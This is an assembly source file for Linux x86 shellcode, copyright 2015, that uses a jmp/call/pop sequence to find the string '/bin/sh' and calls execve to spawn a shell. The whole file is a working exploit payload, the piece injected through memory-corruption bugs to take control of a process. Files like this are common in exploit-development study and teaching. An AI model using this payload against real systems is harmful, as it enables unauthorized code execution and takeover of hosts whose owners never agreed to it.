    #
    # Execve /bin/sh Shellcode Via Pop (Linux x86)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 16 April 2015
    #
    # GPL
    #


    .global _start
_start:
    jmp just_before_str

execve_sh:
    popl %ebx

    xorl %ecx, %ecx

    mull %ecx

    # __NR_execve 11
    movb $11, %al

    int $0x80

just_before_str:
    call execve_sh
    .asciz "/bin/sh"
